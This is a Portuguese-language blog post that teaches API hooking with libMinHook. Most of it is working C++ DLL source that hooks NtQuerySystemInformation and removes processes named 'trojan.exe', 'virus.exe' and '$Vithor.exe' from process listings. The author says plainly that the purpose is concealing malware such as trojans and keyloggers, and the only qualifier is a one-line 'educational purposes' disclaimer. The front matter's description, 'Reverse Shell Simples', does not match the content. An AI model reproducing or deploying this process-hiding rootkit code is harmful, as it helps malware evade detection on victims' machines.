---
weight: 14
title: "Post XIV: API-Hooking"
date: 2023-03-01T15:58:26+08:00
lastmod: 2023-03-03T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, neste post irei compartilhar um artigo meu feito em 2023 para um site que não está mais online, mas que salvei no meu HD. Neste post, vou abordar como ocultar um processo utilizando a `libMinHook`.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## O Que é API Hooking?

API Hooking é uma técnica usada para interceptar chamadas de funções de `APIs` em um software.
Isso permite modificar redirecionar, ou monitorar chamadas de funções específicas.
## Exemplos Praticos:
API Hooking também pode ser usado para esconder processos suspeitos ou atividades indesejadas em um sistema operacional. Ao interceptar chamadas de API relacionadas ao gerenciamento de processos, podemos esconder algum malware como trojans e keyloggers.
## Código da DLL:

### Inclusão da biblioteca libMinHook:

```cpp
#pragma comment(lib, "libMinHook.x64.lib")

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation; // Ponteiro para a função NtQuerySystemInformation original
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;      // Novo ponteiro para a função NtQuerySystemInformation
wchar_t* process;
```
### Função de gancho para NtQuerySystemInformation:

```cpp
NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
```

### Chama a função NtQuerySystemInformation original através do novo ponteiro:
```cpp
    NTSTATUS stat = New_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
```

### Verificação e manipulação da lista de processos:

```cpp
    if (SystemProcessInformation == SystemInformationClass && stat == 0)
    {
        // Itera sobre a lista de processos e remove processos específicos
        P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
        while (prev->NextEntryOffset != NULL) {
            // Verifica se o nome do processo corresponde a processos específicos e os remove da lista
            if (!lstrcmp(curr->ImageName.Buffer, L"$Vithor.exe") || !lstrcmp(curr->ImageName.Buffer, L"trojan.exe") || !lstrcmp(curr->ImageName.Buffer, L"virus.exe")) {
                // Remove o processo da lista, mantendo a integridade da estrutura
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            prev = curr;
            curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return stat;
```

### Configuração do gancho para NtQuerySystemInformation:

```cpp
bool set_nt_hook()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll"); // Obtém o handle do módulo ntdll.dll, onde a função NtQuerySystemInformation está localizada
    
    Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

    // Inicializa o gerenciador de ganchos
    if (MH_Initialize() != MH_OK) { return false; }

    // Cria o gancho para a função NtQuerySystemInformation
    if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) {
        return false;
    }

    // Ativa o gancho
    if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false; }

    return true;
}
```

### Função principal para DLL:

```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Configura o gancho na função NtQuerySystemInformation
        if (!set_nt_hook()) {
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // Desativa e libera o gancho quando a DLL é descarregada
        MH_DisableHook(Original_NtQuerySystemInformation);
        MH_Uninitialize();
        break;
    }
    return TRUE;
}
```

## Explicação do Código

### Interceptação e Modificação da Função NtQuerySystemInformation

O código intercepta e modifica o comportamento da função `NtQuerySystemInformation`, que é usada para obter informações sobre processos no sistema. Para fazer isso, ele usa a biblioteca `libMinHook` para criar e gerenciar ganchos (hooks) na função alvo.
### Variáveis Importantes

Primeiro, o código inclui a biblioteca `libMinHook` e declara duas variáveis importantes:

- `Original_NtQuerySystemInformation`: Ponteiro para a função `NtQuerySystemInformation` original.
- `New_NtQuerySystemInformation`: Novo ponteiro para a função `NtQuerySystemInformation`, que será o ponto de entrada alternativo.
### Função Hooked_NtQuerySystemInformation

A função `Hooked_NtQuerySystemInformation` é o ponto de entrada alternativo para `NtQuerySystemInformation`. Sempre que alguém tenta acessar `NtQuerySystemInformation`, essa função é chamada. Ela verifica se a consulta é para obter informações sobre processos do sistema `SystemProcessInformation`. Se for o caso e a consulta for bem-sucedida, a função percorre a lista de processos e remove processos específicos antes de retornar os resultados.
### Configuração do Gancho

A função `set_nt_hook` é responsável por configurar o gancho na função `NtQuerySystemInformation`. Ela começa obtendo o identificador do módulo `ntdll.dll`, onde a função alvo está localizada. Em seguida, inicializa o gerenciador de ganchos `libMinHook`, cria um gancho para a função `NtQuerySystemInformation` original e redireciona as chamadas para a função `Hooked_NtQuerySystemInformation`. Por fim, ativa o gancho para que ele comece a interceptar as chamadas para a função original.
### Função DllMain

A função `DllMain` é chamada quando a DLL é carregada ou descarregada. Quando a DLL é desanexada `DLL_PROCESS_DETACH`, o gancho é desativado e o gerenciador de ganchos é desinicializado.

---
### Resumo

Em resumo, o código permite a manipulação das informações retornadas pela função `NtQuerySystemInformation` para ocultar processos específicos da lista de processos.
## Prova de Conceito:

![](https://telegra.ph/file/ce7b41995c91b7d9ea2b4.png)